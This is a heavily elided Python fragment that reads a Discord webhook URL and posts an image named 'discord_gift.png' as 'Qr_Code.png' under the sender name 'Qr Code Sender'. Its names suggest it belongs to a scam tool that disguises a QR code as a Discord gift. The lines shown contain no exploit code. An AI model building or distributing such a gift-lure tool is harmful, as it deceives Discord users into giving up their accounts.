...
#Set Webhook Here! 
url = input("WebHook: ")
noob = DiscordWebhook(url=url, username="Qr Code Sender")

# Developer: NightfallGT
# Revised by: Luci (9P9) & Incognito
...
def main():
    ...
    with open('discord_gift.png', 'rb') as f:
    	noob.add_file(file=f.read(), filename='Qr_Code.png')
    	response = noob.execute()
